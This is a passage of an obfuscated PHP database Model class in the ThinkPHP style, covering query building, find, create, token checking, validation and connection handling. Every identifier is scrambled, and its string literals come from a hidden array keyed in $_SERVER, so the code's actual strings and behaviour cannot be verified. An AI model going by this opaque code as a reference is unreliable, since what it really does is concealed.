array($çÛŒî’Ü[331], $óê–ªôÀ); } else { $Ú§«Ê¶†[$†¦½’é‚] = $óê–ªôÀ; } $this->options[$çÛŒî’Ü[330]] = $Ú§«Ê¶†; } elseif (!1 === $óê–ªôÀ) { $óê–ªôÀ = $this->_parseOptions(); return $çÛŒî’Ü[332] . $this->db->buildSelectSql($óê–ªôÀ) . $çÛŒî’Ü[333]; } $óê–ªôÀ = $this->_parseOptions(); $¤ñóÀì€ = $this->db->select($óê–ªôÀ); if (!1 === $¤ñóÀì€) { return !1; } if (empty($¤ñóÀì€)) { return null; } $this->_afterSelect($¤ñóÀì€, $óê–ªôÀ); return $¤ñóÀì€; } protected function _afterSelect(&$€ÖŠ®ƒ, $”âŸÃı¸) { } public function buildSql($ûÈçÆÔ¤ = array()) { $şú´ä =& $_SERVER[ú‡®¯¨±]; $ûÈçÆÔ¤ = $this->_parseOptions($ûÈçÆÔ¤); return $şú´ä[332] . $this->db->buildSelectSql($ûÈçÆÔ¤) . $şú´ä[333]; } public function optionsValue($ñÚ¿éÉ = null) { if (is_null($ñÚ¿éÉ)) { return $this->options; } elseif (is_array($ñÚ¿éÉ)) { $this->options = array_merge($this->options, $ñÚ¿éÉ); } } protected function _parseOptions($ÚÂíÄ»‡ = array()) { $ãüª¤È =& $_SERVER[ú‡®¯¨±]; if (is_array($ÚÂíÄ»‡)) { $ÚÂíÄ»‡ = array_merge($this->options, $ÚÂíÄ»‡); } $this->options = array(); if (!isset($ÚÂíÄ»‡[$ãüª¤È[334]])) { $ÚÂíÄ»‡[$ãüª¤È[334]] = $this->getTableName(); $âÉòàÎ = $this->fields; } else { $âÉòàÎ = $this->getDbFields(); } if (!empty($ÚÂíÄ»‡[$ãüª¤È[335]])) { $ÚÂíÄ»‡[$ãüª¤È[334]] .= $ãüª¤È[53] . $ÚÂíÄ»‡[$ãüª¤È[335]]; } $ÚÂíÄ»‡[$ãüª¤È[336]] = $this->name; if (isset($ÚÂíÄ»‡[$ãüª¤È[330]]) && is_array($ÚÂíÄ»‡[$ãüª¤È[330]]) && !empty($âÉòàÎ) && !isset($ÚÂíÄ»‡[$ãüª¤È[337]]) && !isset($ÚÂíÄ»‡[$ãüª¤È[334]])) { foreach ($ÚÂíÄ»‡[$ãüª¤È[330]] as $Ùı™¡ÃÁ => $‘èğÊ†½) { $Ùı™¡ÃÁ = trim($Ùı™¡ÃÁ); if (in_array($Ùı™¡ÃÁ, $âÉòàÎ, !0)) { if (is_scalar($‘èğÊ†½)) { $this->_parseType($ÚÂíÄ»‡[$ãüª¤È[330]], $Ùı™¡ÃÁ); } } elseif (!is_numeric($Ùı™¡ÃÁ) && $ãüª¤È[11] != substr($Ùı™¡ÃÁ, 0, 1) && !1 === strpos($Ùı™¡ÃÁ, $ãüª¤È[10]) && !1 === strpos($Ùı™¡ÃÁ, $ãüª¤È[315]) && !1 === strpos($Ùı™¡ÃÁ, $ãüª¤È[338]) && !1 === strpos($Ùı™¡ÃÁ, $ãüª¤È[339])) { unset($ÚÂíÄ»‡[$ãüª¤È[330]][$Ùı™¡ÃÁ]); } } } $this->_options_filter($ÚÂíÄ»‡); return $ÚÂíÄ»‡; } protected function _options_filter(&$ª¬‰µ¤) { } protected function _parseType(&$ê†‡âú÷, $‡±¨öšê) { $„ÄåôâŸ =& $_SERVER[ú‡®¯¨±]; if (empty($this->options[$„ÄåôâŸ[340]][$„ÄåôâŸ[4] . $‡±¨öšê])) { $‚½—óæ = strtolower($this->fields[$„ÄåôâŸ[307]][$‡±¨öšê]); if (!1 !== strpos($‚½—óæ, $„ÄåôâŸ[341])) { } elseif (!1 === strpos($‚½—óæ, $„ÄåôâŸ[342]) && !1 !== strpos($‚½—óæ, $„ÄåôâŸ[343])) { $ê†‡âú÷[$‡±¨öšê] = intval($ê†‡âú÷[$‡±¨öšê]); } elseif (!1 !== strpos($‚½—óæ, $„ÄåôâŸ[344]) || !1 !== strpos($‚½—óæ, $„ÄåôâŸ[345])) { $ê†‡âú÷[$‡±¨öšê] = floatval($ê†‡âú÷[$‡±¨öšê]); } elseif (!1 !== strpos($‚½—óæ, $„ÄåôâŸ[346])) { $ê†‡âú÷[$‡±¨öšê] = (bool) $ê†‡âú÷[$‡±¨öšê]; } } } public function find($—íÙüí = array()) { $í‘ş÷Ïß =& $_SERVER[ú‡®¯¨±]; if (is_numeric($—íÙüí) || is_string($—íÙüí)) { $•Ÿ›²Å€[$this->getPk()] = intval($—íÙüí); $this->options[$í‘ş÷Ïß[330]] = $•Ÿ›²Å€; } $this->options[$í‘ş÷Ïß[347]] = 1; $—íÙüí = $this->_parseOptions(); $çÖ‰‚Âê = $this->db->select($—íÙüí); if (!1 === $çÖ‰‚Âê) { return !1; } if (empty($çÖ‰‚Âê)) { return null; } $this->data = $çÖ‰‚Âê[0]; $this->_afterFind($this->data, $—íÙüí); if (!empty($this->options[$í‘ş÷Ïß[348]])) { return $this->returnResult($this->data, $this->options[$í‘ş÷Ïß[348]]); } return $this->data; } protected function _afterFind(&$£ÌÍ‚ìõ, $ùıîÚ›í) { } protected function returnResult($ˆ…ŠœÅ‚, $‚›å©˜ú = '') { $î‰¿òÙ =& $_SERVER[ú‡®¯¨±]; if ($‚›å©˜ú) { if (is_callable($‚›å©˜ú)) { return call_user_func($‚›å©˜ú, $ˆ…ŠœÅ‚); } switch (strtolower($‚›å©˜ú)) { case $î‰¿òÙ[349]: return json_encode($ˆ…ŠœÅ‚); case $î‰¿òÙ[350]: return xml_encode($ˆ…ŠœÅ‚); } } return $ˆ…ŠœÅ‚; } public function parseFieldsMap($ı¼ÓÏÅ«, $Çü¯İ­š = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ëİì–óú => $ø«Ú·ã’) { if ($Çü¯İ­š == 1) { if (isset($ı¼ÓÏÅ«[$ø«Ú·ã’])) { $ı¼ÓÏÅ«[$ëİì–óú] = $ı¼ÓÏÅ«[$ø«Ú·ã’]; unset($ı¼ÓÏÅ«[$ø«Ú·ã’]); } } else { if (isset($ı¼ÓÏÅ«[$ëİì–óú])) { $ı¼ÓÏÅ«[$ø«Ú·ã’] = $ı¼ÓÏÅ«[$ëİì–óú]; unset($ı¼ÓÏÅ«[$ëİì–óú]); } } } } return $ı¼ÓÏÅ«; } public function setField($ÊÓäŒ ¤, $„®†‰¤ = '') { if (is_array($ÊÓäŒ ¤)) { $ÓÛ€Âãì = $ÊÓäŒ ¤; } else { $ÓÛ€Âãì[$ÊÓäŒ ¤] = $„®†‰¤; } return $this->save($ÓÛ€Âãì); } public function setAdd($²ÑÛÀ®è, $§´Ê‚ß = 1) { $û˜ì‰Äş =& $_SERVER[ú‡®¯¨±]; $©ºêòü = $²ÑÛÀ®è . $û˜ì‰Äş[351] . $§´Ê‚ß; if ($§´Ê‚ß < 0) { $©ºêòü = $²ÑÛÀ®è . $§´Ê‚ß; } return $this->setField($²ÑÛÀ®è, array($û˜ì‰Äş[352], $©ºêòü)); } public function getField($¾‡§Áì­, $óÑ³Úè = null) { $½Ê ‰ñŸ =& $_SERVER[ú‡®¯¨±]; $Äù•«¥[$½Ê ‰ñŸ[328]] = $¾‡§Áì­; $Äù•«¥ = $this->_parseOptions($Äù•«¥); $¾‡§Áì­ = trim($¾‡§Áì­); if (strpos($¾‡§Áì­, $½Ê ‰ñŸ[50])) { if (!isset($Äù•«¥[$½Ê ‰ñŸ[347]])) { $Äù•«¥[$½Ê ‰ñŸ[347]] = is_numeric($óÑ³Úè) ? $óÑ³Úè : $½Ê ‰ñŸ[12]; } $¯«¢’½ = $this->db->select($Äù•«¥); if (!empty($¯«¢’½)) { $âœŠ« = explode($½Ê ‰ñŸ[50], $¾‡§Áì­); $¾‡§Áì­ = array_keys($¯«¢’½[0]); $ë«­¨¨Ñ = array_shift($¾‡§Áì­); $Üì®õû = array_shift($¾‡§Áì­); $ÊÕªä§ô = array(); $ü¡ç†íõ = count($âœŠ«); foreach ($¯«¢’½ as $Œ¾ùÍ¦´) { $™‹úÉ«Î = $Œ¾ùÍ¦´[$ë«­¨¨Ñ]; if (2 == $ü¡ç†íõ) { $ÊÕªä§ô[$™‹úÉ«Î] = $Œ¾ùÍ¦´[$Üì®õû]; } else { $ÊÕªä§ô[$™‹úÉ«Î] = is_string($óÑ³Úè) ? implode($óÑ³Úè, $Œ¾ùÍ¦´) : $Œ¾ùÍ¦´; } } return $ÊÕªä§ô; } } else { if (!0 !== $óÑ³Úè) { $Äù•«¥[$½Ê ‰ñŸ[347]] = is_numeric($óÑ³Úè) ? $óÑ³Úè : 1; } if ($óÑ³Úè === $½Ê ‰ñŸ[310]) { unset($Äù•«¥[$½Ê ‰ñŸ[347]]); } $Œ¾ùÍ¦´ = $this->db->select($Äù•«¥); if (!empty($Œ¾ùÍ¦´)) { if ($óÑ³Úè === $½Ê ‰ñŸ[310]) { return reset($Œ¾ùÍ¦´[0]); } if (!0 !== $óÑ³Úè && 1 == $Äù•«¥[$½Ê ‰ñŸ[347]]) { return reset($Œ¾ùÍ¦´[0]); } foreach ($Œ¾ùÍ¦´ as $·Ğ»Ú¯ƒ) { $«´µ·†[] = $·Ğ»Ú¯ƒ[$¾‡§Áì­]; } return $«´µ·†; } } return null; } public function create($•¯óƒ–† = '', $ôâ¨§Ñ¯ = '') { $ß‰¼˜¦ë =& $_SERVER[ú‡®¯¨±]; if (empty($•¯óƒ–†)) { $•¯óƒ–† = $_POST; } elseif (is_object($•¯óƒ–†)) { $•¯óƒ–† = get_object_vars($•¯óƒ–†); } if (empty($•¯óƒ–†) || !is_array($•¯óƒ–†)) { $this->error = think_lang($ß‰¼˜¦ë[326]); return !1; } $•¯óƒ–† = $this->parseFieldsMap($•¯óƒ–†, 0); $ôâ¨§Ñ¯ = $ôâ¨§Ñ¯ ? $ôâ¨§Ñ¯ : (!empty($•¯óƒ–†[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ß‰¼˜¦ë[328]])) { $„š™˜½æ = $this->options[$ß‰¼˜¦ë[328]]; unset($this->options[$ß‰¼˜¦ë[328]]); } elseif ($ôâ¨§Ñ¯ == THINK_MODEL_INSERT && isset($this->insertFields)) { $„š™˜½æ = $this->insertFields; } elseif ($ôâ¨§Ñ¯ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $„š™˜½æ = $this->updateFields; } if (isset($„š™˜½æ)) { if (is_string($„š™˜½æ)) { $„š™˜½æ = explode($ß‰¼˜¦ë[50], $„š™˜½æ); } if (think_config($ß‰¼˜¦ë[353])) { $„š™˜½æ[] = think_config($ß‰¼˜¦ë[354]); } foreach ($•¯óƒ–† as $¢µ¤õˆÏ => $†´¿ğ) { if (!in_array($¢µ¤õˆÏ, $„š™˜½æ)) { unset($•¯óƒ–†[$¢µ¤õˆÏ]); } } } if (!$this->autoValidation($•¯óƒ–†, $ôâ¨§Ñ¯)) { return !1; } if (!$this->autoCheckToken($•¯óƒ–†)) { $this->error = think_lang($ß‰¼˜¦ë[355]); return !1; } if ($this->autoCheckFields) { $„š™˜½æ = $this->getDbFields(); foreach ($•¯óƒ–† as $¢µ¤õˆÏ => $†´¿ğ) { if (!in_array($¢µ¤õˆÏ, $„š™˜½æ)) { unset($•¯óƒ–†[$¢µ¤õˆÏ]); } elseif (MAGIC_QUOTES_GPC && is_string($†´¿ğ)) { $•¯óƒ–†[$¢µ¤õˆÏ] = stripslashes($†´¿ğ); } } } $this->autoOperation($•¯óƒ–†, $ôâ¨§Ñ¯); $this->data = $•¯óƒ–†; return $•¯óƒ–†; } public function autoCheckToken($©ï‹±ó) { $±ß«¥° =& $_SERVER[ú‡®¯¨±]; if (isset($this->options[$±ß«¥°[356]]) && !$this->options[$±ß«¥°[356]]) { return !0; } if (think_config($±ß«¥°[353])) { $‘ı˜Šªì = think_config($±ß«¥°[354]); if (!isset($©ï‹±ó[$‘ı˜Šªì]) || Session::get($‘ı˜Šªì)) { return !1; } list($¦×³ø»Ÿ, $×çĞ½‰Ä) = explode($±ß«¥°[11], $©ï‹±ó[$‘ı˜Šªì]); if ($×çĞ½‰Ä && Session::get($‘ı˜Šªì . $±ß«¥°[10] . $¦×³ø»Ÿ) === $×çĞ½‰Ä) { Session::remove($‘ı˜Šªì . $±ß«¥°[10] . $¦×³ø»Ÿ); return !0; } if (think_config($±ß«¥°[357])) { Session::remove($‘ı˜Šªì . $±ß«¥°[10] . $¦×³ø»Ÿ); } return !1; } return !0; } public function regex($´—Æ–İÒ, $ÜÏ‘‰±…) { $ñ‹×ó£‡ =& $_SERVER[ú‡®¯¨±]; $¿ÕØ¥Èî = array($ñ‹×ó£‡[358] => $ñ‹×ó£‡[359], $ñ‹×ó£‡[360] => $ñ‹×ó£‡[361], $ñ‹×ó£‡[362] => $ñ‹×ó£‡[363], $ñ‹×ó£‡[364] => $ñ‹×ó£‡[365], $ñ‹×ó£‡[366] => $ñ‹×ó£‡[367], $ñ‹×ó£‡[368] => $ñ‹×ó£‡[369], $ñ‹×ó£‡[370] => $ñ‹×ó£‡[371], $ñ‹×ó£‡[345] => $ñ‹×ó£‡[372], $ñ‹×ó£‡[373] => $ñ‹×ó£‡[374]); if (isset($¿ÕØ¥Èî[strtolower($ÜÏ‘‰±…)])) { $ÜÏ‘‰±… = $¿ÕØ¥Èî[strtolower($ÜÏ‘‰±…)]; } return preg_match($ÜÏ‘‰±…, $´—Æ–İÒ) === 1; } private function autoOperation(&$ëà›½³«, $À±èÄúê) { $éì‹àë¼ =& $_SERVER[ú‡®¯¨±]; if (!empty($this->options[$éì‹àë¼[375]])) { $•×´´ú = $this->options[$éì‹àë¼[375]]; unset($this->options[$éì‹àë¼[375]]); } elseif (!empty($this->_auto)) { $•×´´ú = $this->_auto; } if (isset($•×´´ú)) { foreach ($•×´´ú as $ÓÄçõÊ) { if (empty($ÓÄçõÊ[2])) { $ÓÄçõÊ[2] = THINK_MODEL_INSERT; } if ($À±èÄúê == $ÓÄçõÊ[2] || $ÓÄçõÊ[2] == THINK_MODEL_BOTH) { switch (trim($ÓÄçõÊ[3])) { case $éì‹àë¼[376]: case $éì‹àë¼[377]: $ê¼ÚüÏ = isset($ÓÄçõÊ[4]) ? (array) $ÓÄçõÊ[4] : array(); if (isset($ëà›½³«[$ÓÄçõÊ[0]])) { array_unshift($ê¼ÚüÏ, $ëà›½³«[$ÓÄçõÊ[0]]); } if ($éì‹àë¼[376] == $ÓÄçõÊ[3]) { $ëà›½³«[$ÓÄçõÊ[0]] = call_user_func_array($ÓÄçõÊ[1], $ê¼ÚüÏ); } else { $ëà›½³«[$ÓÄçõÊ[0]] = call_user_func_array(array(&$this, $ÓÄçõÊ[1]), $ê¼ÚüÏ); } break; case $éì‹àë¼[328]: $ëà›½³«[$ÓÄçõÊ[0]] = $ëà›½³«[$ÓÄçõÊ[1]]; break; case $éì‹àë¼[378]: if ($éì‹àë¼[12] === $ëà›½³«[$ÓÄçõÊ[0]]) { unset($ëà›½³«[$ÓÄçõÊ[0]]); } break; case $éì‹àë¼[379]: default: $ëà›½³«[$ÓÄçõÊ[0]] = $ÓÄçõÊ[1]; } if (!1 === $ëà›½³«[$ÓÄçõÊ[0]]) { unset($ëà›½³«[$ÓÄçõÊ[0]]); } } } } return $ëà›½³«; } protected function autoValidation($µÁøŠèÇ, $áªöÖ—Ò) { $›ïáİÄ¬ =& $_SERVER[ú‡®¯¨±]; if (!empty($this->options[$›ïáİÄ¬[380]])) { $åÛİùü¦ = $this->options[$›ïáİÄ¬[380]]; unset($this->options[$›ïáİÄ¬[380]]); } elseif (!empty($this->_validate)) { $åÛİùü¦ = $this->_validate; } if (isset($åÛİùü¦)) { if ($this->patchValidate) { $this->error = array(); } foreach ($åÛİùü¦ as $Ú‚õ“˜Ì => $§»óèØô) { if (empty($§»óèØô[5]) || $§»óèØô[5] == THINK_MODEL_BOTH || $§»óèØô[5] == $áªöÖ—Ò) { if (0 == strpos($§»óèØô[2], $›ïáİÄ¬[381]) && strpos($§»óèØô[2], $›ïáİÄ¬[382])) { $§»óèØô[2] = think_lang(substr($§»óèØô[2], 2, -1)); } $§»óèØô[3] = isset($§»óèØô[3]) ? $§»óèØô[3] : THINK_EXISTS_VALIDATE; $§»óèØô[4] = isset($§»óèØô[4]) ? $§»óèØô[4] : $›ïáİÄ¬[383]; switch ($§»óèØô[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($µÁøŠèÇ, $§»óèØô)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($›ïáİÄ¬[12] != trim($µÁøŠèÇ[$§»óèØô[0]])) { if (!1 === $this->_validationField($µÁøŠèÇ, $§»óèØô)) { return !1; } } break; default: if (isset($µÁøŠèÇ[$§»óèØô[0]])) { if (!1 === $this->_validationField($µÁøŠèÇ, $§»óèØô)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($‚îÆªÍï, $¢ÆŠÒùÖ) { if (!1 === $this->_validationFieldItem($‚îÆªÍï, $¢ÆŠÒùÖ)) { if ($this->patchValidate) { $this->error[$¢ÆŠÒùÖ[0]] = $¢ÆŠÒùÖ[2]; } else { $this->error = $¢ÆŠÒùÖ[2]; return !1; } } return; } protected function _validationFieldItem($âÃµÑˆ, $ÁúÙË¥Ò) { $÷­ÚŠ»Ç =& $_SERVER[ú‡®¯¨±]; switch (strtolower(trim($ÁúÙË¥Ò[4]))) { case $÷­ÚŠ»Ç[376]: case $÷­ÚŠ»Ç[377]: $—Öİ—¥® = isset($ÁúÙË¥Ò[6]) ? (array) $ÁúÙË¥Ò[6] : array(); if (is_string($ÁúÙË¥Ò[0]) && strpos($ÁúÙË¥Ò[0], $÷­ÚŠ»Ç[50])) { $ÁúÙË¥Ò[0] = explode($÷­ÚŠ»Ç[50], $ÁúÙË¥Ò[0]); } if (is_array($ÁúÙË¥Ò[0])) { foreach ($ÁúÙË¥Ò[0] as $å¬¾êÖ) { $„äÂ›‰´[$å¬¾êÖ] = $âÃµÑˆ[$å¬¾êÖ]; } array_unshift($—Öİ—¥®, $„äÂ›‰´); } else { array_unshift($—Öİ—¥®, $âÃµÑˆ[$ÁúÙË¥Ò[0]]); } if ($÷­ÚŠ»Ç[376] == $ÁúÙË¥Ò[4]) { return call_user_func_array($ÁúÙË¥Ò[1], $—Öİ—¥®); } else { return call_user_func_array(array(&$this, $ÁúÙË¥Ò[1]), $—Öİ—¥®); } case $÷­ÚŠ»Ç[384]: return $âÃµÑˆ[$ÁúÙË¥Ò[0]] == $âÃµÑˆ[$ÁúÙË¥Ò[1]]; case $÷­ÚŠ»Ç[385]: if (is_string($ÁúÙË¥Ò[0]) && strpos($ÁúÙË¥Ò[0], $÷­ÚŠ»Ç[50])) { $ÁúÙË¥Ò[0] = explode($÷­ÚŠ»Ç[50], $ÁúÙË¥Ò[0]); } $ÅçöĞ­± = array(); if (is_array($ÁúÙË¥Ò[0])) { foreach ($ÁúÙË¥Ò[0] as $å¬¾êÖ) { $ÅçöĞ­±[$å¬¾êÖ] = $âÃµÑˆ[$å¬¾êÖ]; } } else { $ÅçöĞ­±[$ÁúÙË¥Ò[0]] = $âÃµÑˆ[$ÁúÙË¥Ò[0]]; } if (!empty($âÃµÑˆ[$this->getPk()])) { $ÅçöĞ­±[$this->getPk()] = array($÷­ÚŠ»Ç[386], $âÃµÑˆ[$this->getPk()]); } if ($this->where($ÅçöĞ­±)->find()) { return !1; } return !0; default: return $this->check($âÃµÑˆ[$ÁúÙË¥Ò[0]], $ÁúÙË¥Ò[1], $ÁúÙË¥Ò[4]); } } public function check($’–‚îÀ¾, $«¦‘‚è, $ßÔáÂ’ˆ = "\162\145\147\145\170") { $ÑÉÛ¦éœ =& $_SERVER[ú‡®¯¨±]; $ßÔáÂ’ˆ = strtolower(trim($ßÔáÂ’ˆ)); switch ($ßÔáÂ’ˆ) { case $ÑÉÛ¦éœ[7]: case $ÑÉÛ¦éœ[387]: $ˆÌ¯˜õÔ = is_array($«¦‘‚è) ? $«¦‘‚è : explode($ÑÉÛ¦éœ[50], $«¦‘‚è); return $ßÔáÂ’ˆ == $ÑÉÛ¦éœ[7] ? in_array($’–‚îÀ¾, $ˆÌ¯˜õÔ) : !in_array($’–‚îÀ¾, $ˆÌ¯˜õÔ); case $ÑÉÛ¦éœ[388]: case $ÑÉÛ¦éœ[389]: if (is_array($«¦‘‚è)) { $ÃÆª«úÎ = $«¦‘‚è[0]; $å¸À“ùœ = $«¦‘‚è[1]; } else { list($ÃÆª«úÎ, $å¸À“ùœ) = explode($ÑÉÛ¦éœ[50], $«¦‘‚è); } return $ßÔáÂ’ˆ == $ÑÉÛ¦éœ[388] ? $’–‚îÀ¾ >= $ÃÆª«úÎ && $’–‚îÀ¾ <= $å¸À“ùœ : $’–‚îÀ¾ < $ÃÆª«úÎ || $’–‚îÀ¾ > $å¸À“ùœ; case $ÑÉÛ¦éœ[390]: case $ÑÉÛ¦éœ[391]: return $ßÔáÂ’ˆ == $ÑÉÛ¦éœ[390] ? $’–‚îÀ¾ == $«¦‘‚è : $’–‚îÀ¾ != $«¦‘‚è; case $ÑÉÛ¦éœ[392]: $•´¼¸ğ­ = mb_strlen($’–‚îÀ¾, $ÑÉÛ¦éœ[393]); if (strpos($«¦‘‚è, $ÑÉÛ¦éœ[50])) { list($ÃÆª«úÎ, $å¸À“ùœ) = explode($ÑÉÛ¦éœ[50], $«¦‘‚è); return $•´¼¸ğ­ >= $ÃÆª«úÎ && $•´¼¸ğ­ <= $å¸À“ùœ; } else { return $•´¼¸ğ­ == $«¦‘‚è; } case $ÑÉÛ¦éœ[394]: list($¦„Ç¥¿Ö, $şÔå¬¯›) = explode($ÑÉÛ¦éœ[50], $«¦‘‚è); if (!is_numeric($¦„Ç¥¿Ö)) { $¦„Ç¥¿Ö = strtotime($¦„Ç¥¿Ö); } if (!is_numeric($şÔå¬¯›)) { $şÔå¬¯› = strtotime($şÔå¬¯›); } return NOW_TIME >= $¦„Ç¥¿Ö && NOW_TIME <= $şÔå¬¯›; case $ÑÉÛ¦éœ[395]: return in_array(get_client_ip(), explode($ÑÉÛ¦éœ[50], $«¦‘‚è)); case $ÑÉÛ¦éœ[396]: return !in_array(get_client_ip(), explode($ÑÉÛ¦éœ[50], $«¦‘‚è)); case $ÑÉÛ¦éœ[383]: default: return $this->regex($’–‚îÀ¾, $«¦‘‚è); } } public function query($Ûº‡¿î°, $çûğõŞ = false) { $™ó¼ÉñÚ =& $_SERVER[ú‡®¯¨±]; if (!is_bool($çûğõŞ) && !is_array($çûğõŞ)) { $çûğõŞ = func_get_args(); array_shift($çûğõŞ); } $Ûº‡¿î° = str_replace(array($™ó¼ÉñÚ[207], $™ó¼ÉñÚ[397]), $™ó¼ÉñÚ[53], $Ûº‡¿î°); $Ûº‡¿î° = $this->parseSql($Ûº‡¿î°, $çûğõŞ); return $this->db->query($Ûº‡¿î°); } public function execute($©ñ™ıèÅ, $Áœû©ôç = false) { if (!is_bool($Áœû©ôç) && !is_array($Áœû©ôç)) { $Áœû©ôç = func_get_args(); array_shift($Áœû©ôç); } $©ñ™ıèÅ = $this->parseSql($©ñ™ıèÅ, $Áœû©ôç); return $this->db->execute($©ñ™ıèÅ); } protected function parseSql($åÜôÏ¹’, $üÃ» É) { $ø²£İ·ï =& $_SERVER[ú‡®¯¨±]; if (!0 === $üÃ» É) { $İÉê¸šì = $this->_parseOptions(); $åÜôÏ¹’ = $this->db->parseSql($åÜôÏ¹’, $İÉê¸šì); } elseif (is_array($üÃ» É)) { $üÃ» É = array_map(array($this->db, $ø²£İ·ï[398]), $üÃ» É); $åÜôÏ¹’ = vsprintf($åÜôÏ¹’, $üÃ» É); } else { $åÜôÏ¹’ = strtr($åÜôÏ¹’, array($ø²£İ·ï[399] => $this->getTableName(), $ø²£İ·ï[400] => think_config($ø²£İ·ï[299]))); } $this->db->setModel($this->name); return $åÜôÏ¹’; } public function db($¡Ë„­âÙ = '', $Ÿœ€¢ã = '', $şœİ¡û = array()) { $Åï¾œ¥ =& $_SERVER[ú‡®¯¨±]; if ($Åï¾œ¥[12] === $¡Ë„­âÙ && $this->db) { return $this->db; } static $áè³¬Ãí = array(); static $Ã„äßŠœ = array(); if (!isset($Ã„äßŠœ[$¡Ë„­âÙ]) || isset($Ã„äßŠœ[$¡Ë„­âÙ]) && $Ÿœ€¢ã && $áè³¬Ãí[$¡Ë„­âÙ] != $Ÿœ€¢ã) { if (!empty($Ÿœ€¢ã) && is_string($Ÿœ€¢ã) && !1 === strpos($Ÿœ€¢ã, $Åï¾œ¥[8])) { $Ÿœ€¢ã = think_config($Ÿœ€¢ã); } $¡Ë„­âÙ = think_guid($Ÿœ€¢ã); $Ã„äßŠœ[$¡Ë„­âÙ] = Db::getInstance($Ÿœ€¢ã); } elseif (NULL === $Ÿœ€¢ã) { $Ã„äßŠœ[$¡Ë„­âÙ]->close(); unset($Ã„äßŠœ[$¡Ë„­âÙ]); return; } if (!empty($şœİ¡û)) { if (is_string($şœİ¡û)) { parse_str($şœİ¡û, $şœİ¡û); } foreach ($şœİ¡û as $ä¯Ì‹Õ => $ê±»åÖ´) { $this->setProperty($ä¯Ì‹Õ, $ê±»åÖ´); } } $áè³¬Ãí[$¡Ë„­âÙ] = $Ÿœ€¢ã; $this->db = $Ã„äßŠœ[$¡Ë„­âÙ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¨«¸î™ô = get_class($this); if ($¨«¸î™ô == $_SERVER[ú‡®¯¨±][401]) { return $this->name; } $this->name = substr($¨«¸î™ô, 0, -5); } return $this->name; } public function getTableName() { $Í¶«“ µ =& $_SERVER[ú‡®¯¨±]; if (empty($this->trueTableName)) { $ï”û¦£² = !empty($this->tablePrefix) ? $this->tablePrefix : $Í¶«“ µ[12]; if (!empty($this->tableName)) { $ï”û¦£² .= $this->tableName; } else { $ï”û¦£² .= think_parse_name($this->name); } $this->trueTableName = strtolower($ï”û¦£²); } return (!empty($this->dbName) ? $this->dbName . $Í¶«“ µ[10] : $Í¶«“ µ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $º‡ÕÕ¦â =& $_SERVER[ú‡®¯¨±]; return isset($this->fields[$º‡ÕÕ¦â[306]]) ? $this->fields[$º‡ÕÕ¦â[306]] : $this->pk; } public function getDbFields() { $ñ …š¹„ =& $_SERVER[ú‡®¯¨±]; if (isset($this->options[$ñ …š¹„[334]])) { $ùË“Àìˆ = $this->db->getFields($this->options[$ñ …š¹„[334]]); return $ùË“Àìˆ ? array_keys($ùË“Àìˆ) : !1; } if ($this->fields) { $ùË“Àìˆ = $this->fields; unset($ùË“Àìˆ[$ñ …š¹„[305]], $ùË“Àìˆ[$ñ …š¹„[306]], $ùË“Àìˆ[$ñ …š¹„[307]], $ùË“Àìˆ[$ñ …š¹„[304]]); return $ùË“Àìˆ; } return !1; } public function data($ÇéÂĞ›¹ = '') { $¶°Ÿ¥é‹ =& $_SERVER[ú‡®¯¨±]; if ($¶°Ÿ¥é‹[12] === $ÇéÂĞ›¹ && !empty($this->data)) { return $this->data; } if (is_object($ÇéÂĞ›¹)) { $ÇéÂĞ›¹ = get_object_vars($ÇéÂĞ›¹); } elseif (is_string($ÇéÂĞ›¹)) { parse_str($ÇéÂĞ›¹, $ÇéÂĞ›¹); } elseif (!is_array($ÇéÂĞ›¹)) { think_exception(think_lang($¶°Ÿ¥é‹[326])); } $this->data = $ÇéÂĞ›¹; return $this; } public function join($üŒŸ£—) { $¢à–óÃá =& $_SERVER[ú‡®¯¨±]; if (is_array($üŒŸ£—)) { $this->options[$¢à–óÃá[337]] = $üŒŸ£—; } elseif (!empty($üŒŸ£—)) { $this->options[$¢à–óÃá[337]][] = $üŒŸ£—; } return $this; } public function union($çŸëıÁÌ, $ÄÛ‡Ğ Ù = false) { $¢şü†ë’ =& $_SERVER[ú‡®¯¨±]; if (empty($çŸëıÁÌ)) { return $this; } if ($ÄÛ‡Ğ Ù) { $this->options[$¢şü†ë’[402]][$¢şü†ë’[403]] = !0; } if (is_object($çŸëıÁÌ)) { $çŸëıÁÌ = get_object_vars($çŸëıÁÌ); } if (is_string($çŸëıÁÌ)) { $„Ù‹Ò›¼ = $çŸëıÁÌ; } elseif (is_array($çŸëıÁÌ)) { if (isset($çŸëıÁÌ[0])) { $this->options[$¢şü†ë’[402]] = array_merge($this->options[$¢şü†ë’[402]], $çŸëıÁÌ); return $this; } else { $„Ù‹Ò›¼ = $çŸëıÁÌ; } } else { think_exception(think_lang($¢şü†ë’[326])); } $this->options[$¢şü†ë’[402]][] = $„Ù‹Ò›¼; return $this; } public function cache($‡ö²¢ÍØ = true, $§¤¨¨€î = null, $¯Şã„ˆ™ = '') { $ıüŒÖø =& $_SERVER[ú‡®¯¨±]; if (!1 !== $‡ö²¢ÍØ) { $this->options[$ıüŒÖø[404]] = array($ıüŒÖø[96] => $‡ö²¢ÍØ, $ıüŒÖø[394] => $§¤¨¨€î, $ıüŒÖø[33] => $¯Şã„ˆ™); } return $this; } public function field($ÚÁ«Ã, $Õµ›§¡ = false) { $ŸÁ¨ëáœ =& $_SERVER[ú‡®¯¨±]; if (!0 === $ÚÁ«Ã) { $…âƒüé = $this->getDbFields(); $ÚÁ«Ã = $…âƒüé ? $…âƒüé : $ŸÁ¨ëáœ[215]; } elseif ($Õµ›§¡) { if (is_string($ÚÁ«Ã)) { 